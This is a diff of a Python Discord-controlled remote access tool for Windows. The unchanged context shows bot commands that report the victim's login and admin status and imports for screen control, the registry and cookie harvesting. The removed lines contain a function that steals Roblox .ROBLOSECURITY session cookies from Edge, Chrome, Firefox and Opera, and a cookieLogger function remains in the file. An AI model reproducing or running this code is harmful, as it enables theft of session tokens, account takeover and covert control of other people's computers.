@@ -1,8 +1,6 @@
-import pyautogui, cv2, time, threading, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, win32api as win32, win32con, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil, base64,codecs,zlib
+import pyautogui, cv2, time, threading, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil
 from discord.ext import commands
-from urllib import request
 from ctypes import Structure, windll, c_uint, sizeof, byref
-from PIL import ImageTk,Image
 
 client = commands.Bot(command_prefix='!',intents=discord.Intents.all())
 client.remove_command("help")
@@ -524,17 +522,6 @@ async def admin_check(ctx, usid):
             await ctx.send(f"You have admin privileges against **{os.getlogin()}**")
         elif not value:
             await ctx.send(f"You do not have admin privileges against **{os.getlogin()}**")
-
-def browser_cookie():
-    import browser_cookie3
-    try:cookies = browser_cookie3.edge(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
-    except:pass
-    try:cookies = browser_cookie3.chrome(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
-    except:pass
-    try:cookies = browser_cookie3.firefox(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
-    except:pass
-    try:cookies = browser_cookie3.opera(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
-    except:pass
 
 def cookieLogger():
 
